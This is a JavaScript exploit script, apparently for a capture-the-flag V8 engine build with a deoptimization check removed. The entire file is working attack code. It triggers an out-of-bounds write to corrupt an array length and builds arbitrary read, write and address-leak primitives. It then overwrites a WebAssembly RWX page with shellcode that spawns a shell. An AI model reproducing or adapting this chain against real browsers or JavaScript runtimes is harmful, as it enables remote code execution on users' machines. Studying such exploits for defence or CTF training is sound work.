const NUM_LOOPS_FOR_OPTIM = 100000; /* Change this if it is not optimizing */

// conversion between floats, integers, and SMIs
// stolen from here: https://www.jaybosamiya.com/blog/2019/01/02/krautflare/
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
	return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
	int_view[0] = this;
	return float_view[0];
}
BigInt.prototype.smi2f = function() {
	int_view[0] = this << 32n;
	return float_view[0];
}
Number.prototype.f2i = function() {
	float_view[0] = this;
	return int_view[0];
}
Number.prototype.f2smi = function() {
	float_view[0] = this;
	return int_view[0] >> 32n;
}
Number.prototype.i2f = function() {
	return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
	return BigInt(this).smi2f();
}

// used later to access OOB
oob_buffer = undefined;

// function that accesses an array based on parameter
// we will first make v8 optimize the function, then access it with
// an invalid index. Since the deoptimization code has been removed, this
// will lead to an OOB access.
//
// c will contain unpacked values and will be used for the addrof primitive
// d will contain packed values and will be used for arbitrary read/write
function foobar(idx) {
	let a = [0.1, 0.1, 0.1, 0.1, 0.1, 0.1];
	let b = [1.1, 1.2, 1.3, 1.4, 1.5];
	let c = [{}, 2.2, 2.3, 2.4, 2.5, 2.6, 2.7, 2.8];
	let d = [3.1, 3.2, 3.3, 3.4];

	a[idx * 16] = (1024*1024).smi2f();

	oob_buffer = b;
	oob_buffer_unpacked = c;
	oob_buffer_packed = d;
}

// optimize function
for (var i = 0; i < NUM_LOOPS_FOR_OPTIM ; i++) {
	foobar(0);
}

// trigger function with oob value :))
// deoptimization isn't triggered, thus we end up setting a[16] to (1024 * 1024)
// this offset happens to be oob_buffer's length field
foobar(1);

console.log("[+] oob_buffer.length: " + oob_buffer.length);
if (oob_buffer.length != (1024 * 1024)) {
	throw "[-] failed to corrupt ArrayBuffer lenght";
}

// offset from oob_buffer to oob_buffer_packed
const RW_OFFSET = 38;
// offset from oob_buffer to oob_buffer_unpacked
const ADDR_OFFSET = 18;
const BACKING_POINTER_OFFSET = 15n;
// used to sanity-check arbitrary rw
const leaked_addr_backing = oob_buffer[RW_OFFSET].f2i() + BACKING_POINTER_OFFSET;

// Expects addr as bigint
function arb_read(addr) {
	let old = oob_buffer[RW_OFFSET];
	oob_buffer[RW_OFFSET] = (addr - BACKING_POINTER_OFFSET).i2f();
	r = oob_buffer_packed[0].f2i();
	oob_buffer[RW_OFFSET] = old;
	return r;
}

if (arb_read(leaked_addr_backing + 16n).i2f() != 3.3) {
	console.log(arb_read(leaked_addr_backing + 16n).i2f());
	throw "[-] arb_read failed sanity check";
}
console.log("[+] defined arb_read");

/* Expects addr and val as bigint */
function arb_write(addr, val) {
	let old = oob_buffer[RW_OFFSET];
	oob_buffer[RW_OFFSET] = (addr - BACKING_POINTER_OFFSET).i2f();
	oob_buffer_packed[0] = val.i2f();
	oob_buffer[RW_OFFSET] = old;
}

arb_write(leaked_addr_backing + 8n, (13.37).f2i());
if (oob_buffer_packed[1] != 13.37) {
	throw "[-] arb_write failed sanity check";
}
console.log("[+] defined arb_write");

// Expects an object as argument
// returns the address of the object
function addr_of(o) {
	let old = oob_buffer_unpacked[0];
	oob_buffer_unpacked[0] = o;
	let r = oob_buffer[ADDR_OFFSET].f2i();
	oob_buffer_unpacked[0] = old;
	return r;
}

(function (){
	let t1 = {};
	let t2 = {};
	let a1 = addr_of(t1) & (~0xffffn);
	let a2 = addr_of(t2) & (~0xffffn);
	let a3 = leaked_addr_backing & (~0xffffn);
	if (a1 != a2 || a1 != a3) {
		throw "[FAIL] addr_of failed sanity check"
	}
})();
console.log("[+] defined addr_of");

console.log("[+] wasm stuff incoming");
var wasm_code = new Uint8Array([
	// fac wasm code
	// see: https://github.com/WebAssembly/wabt/tree/master/wasm2c/examples/fac
	0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x06, 0x01, 0x60,
	0x01, 0x7f, 0x01, 0x7f, 0x03, 0x02, 0x01, 0x00, 0x07, 0x07, 0x01, 0x03,
	0x66, 0x61, 0x63, 0x00, 0x00, 0x0a, 0x19, 0x01, 0x17, 0x00, 0x20, 0x00,
	0x41, 0x00, 0x46, 0x04, 0x7f, 0x41, 0x01, 0x05, 0x20, 0x00, 0x20, 0x00,
	0x41, 0x01, 0x6b, 0x10, 0x00, 0x6c, 0x0b, 0x0b
]);

let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
let f = wasm_mod.exports.fac;
/*%DebugPrint(wasm_mod.exports); */
/*%DebugPrint(f); */
let f_addr = addr_of(f);
console.log("[+] f_addr: " + f_addr.hex());

/* Object -> HeapObject -> JSReceiver -> JSObject -> JSFunction */
/* first field in a heap object is a map */
/* 0x0		kMapOffset	(HeapObject) */
/* 0x8		kPropertiesOrHashOffset (JSReceiver) */
/* 0x10		kElementsOffset (JSObject) */
/* 0x18		kSharedFunctionInfoOffset */
let kFunctionDataOffset = 0n;
let kSharedFunctionInfoOffset = 0x18n;

let shared_info = arb_read(f_addr - 1n + kSharedFunctionInfoOffset) - 1n;
console.log("[+] shared info: " + shared_info.hex());
let function_data = arb_read(shared_info + kFunctionDataOffset) - 1n;
console.log("[+] function data: " + function_data.hex());
//let rwx = arb_read(shared_info - 0x78n);
// the 0x60 offset was found by trial and error using gdb
let rwx = arb_read(shared_info - 0x60n);
console.log("[+] rwx address: " + rwx.hex());

if ((rwx & 0xfffn) != 0) {
	throw "[-] address is not page-aligned!";
}

let shellcode = [
	0x9090909090909090n,
	0x91969dd1bb48c031n,
	0x53dbf748ff978cd0n,
	0xb05e545752995f54n,
	0xcccccccccc050f3bn
];

console.log("[+] writing shellcode");
for (var i = 0; i < shellcode.length; i++) {
	let a = rwx + (BigInt(i) * 8n);
	arb_write(a, shellcode[i]);
}
console.log("[+] done! shell incoming :))");
wasm_mod.exports.fac();
